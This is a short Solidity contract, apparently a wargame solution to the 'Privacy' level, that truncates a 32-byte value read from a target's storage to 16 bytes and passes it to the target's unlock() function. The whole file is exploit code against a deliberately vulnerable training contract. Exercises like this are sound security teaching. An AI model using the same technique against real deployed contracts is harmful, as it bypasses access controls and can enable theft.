// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;


interface Privacy {
    function unlock(bytes16 _key) external;
}

contract PrivacyAttack{


    function attack(address target, bytes32 input) external {
        bytes16 key = bytes16(input);

        Privacy privacy = Privacy(target);
        privacy.unlock(key);
    }
}